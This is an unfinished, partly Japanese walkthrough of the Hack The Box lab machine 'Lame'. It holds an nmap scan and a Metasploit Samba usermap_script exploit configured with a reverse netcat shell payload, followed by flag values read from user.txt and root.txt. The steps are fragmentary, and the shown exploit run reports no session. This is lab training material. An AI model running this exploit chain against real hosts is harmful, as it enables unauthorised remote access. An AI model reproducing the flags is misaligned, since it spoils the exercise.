Unfinished
# How to solove ?

## add Lame to /etc/hosts
sudo vim /etc/hosts

## scan on nmap 
`nmap -sC -sV -sT -Pn  10.10.10.3`
<details><summary>nmap 実行結果</summary>

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-08 01:18 JST   
Nmap scan report for lame.htb (10.10.10.3)   
Host is up (0.26s latency).   
Not shown: 996 filtered ports   
PORT    STATE SERVICE     VERSION   
21/tcp  open  ftp         vsftpd 2.3.4   
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)   
| ftp-syst:    
|   STAT:    
| FTP server status:   
|      Connected to 10.10.14.11   
|      Logged in as ftp   
|      TYPE: ASCII   
|      No session bandwidth limit   
|      Session timeout in seconds is 300   
|      Control connection is plain text   
|      Data connections will be plain text   
|      vsFTPd 2.3.4 - secure, fast, stable   
|_End of status   
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)   
| ssh-hostkey:    
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)   
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)   
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)   
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)   
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel   
   
Host script results:   
|_clock-skew: mean: 2h31m02s, deviation: 3h32m10s, median: 1m00s   
| smb-os-discovery:    
|   OS: Unix (Samba 3.0.20-Debian)   
|   Computer name: lame   
|   NetBIOS computer name:    
|   Domain name: hackthebox.gr   
|   FQDN: lame.hackthebox.gr   
|_  System time: 2021-02-07T11:19:35-05:00   
| smb-security-mode:    
|   account_used: guest   
|   authentication_level: user   
|   challenge_response: supported   
|_  message_signing: disabled (dangerous, but default)   
|_smb2-time: Protocol negotiation failed (SMB2)   
   
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .   
Nmap done: 1 IP address (1 host up) scanned in 69.98 seconds   
</details>

###  Summary
PORT    STATE SERVICE     VERSION   
21/tcp  open  ftp         vsftpd 2.3.4   
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)   
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)   
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)   

## 




msf6 exploit(multi/samba/usermap_script) > options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.10.3       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.16.171:4444 
[*] Exploit completed, but no session was created.

## 
/home/makis
cat user.txt
a389b0de2070fe13684237564f6bebfc


cd /root
cat root.txt
cabcb75b9fa627b4759a757d920a9f68
